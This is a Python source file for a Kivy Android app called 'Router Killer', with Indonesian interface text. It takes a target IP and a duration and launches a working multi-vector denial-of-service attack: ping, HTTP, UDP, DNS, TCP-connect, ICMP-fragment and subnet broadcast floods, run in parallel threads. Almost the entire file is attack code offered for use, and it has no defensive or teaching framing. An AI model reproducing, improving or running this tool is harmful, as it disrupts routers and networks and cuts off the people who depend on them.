"""
EL CIENCO - ROUTER KILLER
Kivy APK Version
Full serangan: UDP, DNS, SYN, HTTP, Ping, Broadcast
"""

import threading
import time
import random
import socket
import subprocess
import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.spinner import Spinner
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.core.window import Window

# Ukuran window (biar muat di HP)
Window.size = (360, 600)


class RouterKillerApp(App):
    attacking = False
    packet_count = 0
    start_time = 0

    def build(self):
        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)

        # Title
        self.title_label = Label(
            text='[color=ff3333]⚡ EL CIENCO - ROUTER KILLER ⚡[/color]',
            markup=True,
            size_hint=(1, 0.1),
            font_size='18sp'
        )
        layout.add_widget(self.title_label)

        # IP Input
        layout.add_widget(Label(text='Target IP:', size_hint=(1, 0.05)))
        self.ip_input = TextInput(text='192.168.1.1', multiline=False, size_hint=(1, 0.08))
        layout.add_widget(self.ip_input)

        # Durasi
        layout.add_widget(Label(text='Durasi (detik):', size_hint=(1, 0.05)))
        self.durasi_spinner = Spinner(
            text='60',
            values=('10', '30', '60', '120', '180', '300'),
            size_hint=(1, 0.08)
        )
        layout.add_widget(self.durasi_spinner)

        # Tombol Start
        self.start_btn = Button(
            text='🔥 START SERANGAN 🔥',
            background_color=(0.8, 0, 0, 1),
            size_hint=(1, 0.12)
        )
        self.start_btn.bind(on_press=self.start_attack)
        layout.add_widget(self.start_btn)

        # Tombol Stop
        self.stop_btn = Button(
            text='⛔ STOP',
            disabled=True,
            size_hint=(1, 0.1)
        )
        self.stop_btn.bind(on_press=self.stop_attack)
        layout.add_widget(self.stop_btn)

        # Status
        self.status_label = Label(text='Siap.', size_hint=(1, 0.05), font_size='12sp')
        layout.add_widget(self.status_label)

        # Packet counter
        self.packet_label = Label(text='Paket: 0', size_hint=(1, 0.05))
        layout.add_widget(self.packet_label)

        # Progress bar
        self.progress = ProgressBar(max=100, value=0, size_hint=(1, 0.05))
        layout.add_widget(self.progress)

        return layout

    def update_display(self, dt):
        if self.attacking:
            elapsed = int(time.time() - self.start_time)
            durasi = int(self.durasi_spinner.text)
            percent = min(100, int((elapsed / durasi) * 100))
            self.progress.value = percent
            self.packet_label.text = f'Paket dikirim: {self.packet_count:,}'
            self.status_label.text = f'Menyerang... {elapsed}/{durasi}s'

    def start_attack(self, instance):
        router_ip = self.ip_input.text.strip()
        durasi = int(self.durasi_spinner.text)

        if not router_ip:
            self.status_label.text = 'Masukkan IP target!'
            return

        self.attacking = True
        self.packet_count = 0
        self.start_time = time.time()
        self.start_btn.disabled = True
        self.stop_btn.disabled = False

        # Jalankan serangan di thread terpisah
        self.attack_thread = threading.Thread(target=self.run_attacks, args=(router_ip, durasi))
        self.attack_thread.daemon = True
        self.attack_thread.start()

        # Update UI tiap detik
        Clock.schedule_interval(self.update_display, 1)

    def stop_attack(self, instance):
        self.attacking = False
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
        self.status_label.text = 'Dihentikan manual.'
        Clock.unschedule(self.update_display)
        self.progress.value = 0

    def run_attacks(self, router_ip, durasi):
        # ========== SEMUA SERANGAN ==========

        def ping_flood():
            while self.attacking:
                try:
                    if os.name == 'nt':
                        subprocess.call(f"ping -n 1 -l 65500 {router_ip} > nul 2>&1", shell=True)
                    else:
                        subprocess.call(f"ping -c 1 -s 65507 {router_ip} > /dev/null 2>&1", shell=True)
                    self.packet_count += 1
                except:
                    pass

        def http_flood():
            import urllib.request
            while self.attacking:
                try:
                    req = urllib.request.Request(f"http://{router_ip}/", headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                    })
                    urllib.request.urlopen(req, timeout=1)
                    self.packet_count += 1
                except:
                    self.packet_count += 1

        def udp_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(65507)
                ports = [80, 443, 53, 67, 68, 123, 1900, 5353, 8080, 8443]
                while self.attacking:
                    for port in ports:
                        try:
                            sock.sendto(data, (router_ip, port))
                            self.packet_count += 1
                        except:
                            pass
            except:
                pass

        def dns_flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                domains = ["google.com", "facebook.com", "youtube.com", "whatsapp.com",
                           "instagram.com", "twitter.com", "tiktok.com", "netflix.com"]
                while self.attacking:
                    for domain in domains:
                        try:
                            query = bytearray()
                            query.extend(random.randbytes(2))
                            query.extend(b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')
                            for part in domain.split('.'):
                                query.append(len(part))
                                query.extend(part.encode())
                            query.append(0)
                            query.extend(b'\x00\x01\x00\x01')
                            sock.sendto(query, (router_ip, 53))
                            self.packet_count += 1
                        except:
                            pass
            except:
                pass

        def syn_flood():
            ports = [80, 443, 8080, 8443, 22, 23, 53]
            while self.attacking:
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        sock.connect((router_ip, port))
                        sock.close()
                        self.packet_count += 1
                    except:
                        self.packet_count += 1

        def icmp_frag():
            while self.attacking:
                try:
                    if os.name == 'nt':
                        subprocess.call(f"ping -n 1 -l 1000 -f {router_ip} > nul 2>&1", shell=True)
                    else:
                        subprocess.call(f"ping -c 1 -s 1000 -M do {router_ip} > /dev/null 2>&1", shell=True)
                    self.packet_count += 1
                except:
                    pass

        def broadcast_flood():
            try:
                broadcast_ip = '.'.join(router_ip.split('.')[:3]) + ".255"
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                data = random._urandom(1400)
                ports = [80, 53, 5353, 1900, 67, 68]
                while self.attacking:
                    for port in ports:
                        try:
                            sock.sendto(data, (broadcast_ip, port))
                            self.packet_count += 1
                        except:
                            pass
            except:
                pass

        # Jalankan semua serangan dalam thread
        threads = []
        for _ in range(3):
            t = threading.Thread(target=ping_flood)
            t.daemon = True
            threads.append(t)
            t.start()

        for _ in range(2):
            t = threading.Thread(target=http_flood)
            t.daemon = True
            threads.append(t)
            t.start()

        t = threading.Thread(target=udp_flood)
        t.daemon = True
        threads.append(t)
        t.start()

        t = threading.Thread(target=dns_flood)
        t.daemon = True
        threads.append(t)
        t.start()

        for _ in range(3):
            t = threading.Thread(target=syn_flood)
            t.daemon = True
            threads.append(t)
            t.start()

        t = threading.Thread(target=icmp_frag)
        t.daemon = True
        threads.append(t)
        t.start()

        t = threading.Thread(target=broadcast_flood)
        t.daemon = True
        threads.append(t)
        t.start()

        # Tunggu sampai durasi habis atau dihentikan
        for _ in range(durasi):
            if not self.attacking:
                break
            time.sleep(1)

        self.attacking = False
        Clock.schedule_once(self.attack_finished, 0)

    def attack_finished(self, dt):
        self.start_btn.disabled = False
        self.stop_btn.disabled = True
        self.status_label.text = f'Selesai. Total: {self.packet_count:,} paket.'
        Clock.unschedule(self.update_display)
        self.progress.value = 0


if __name__ == '__main__':
    RouterKillerApp().run()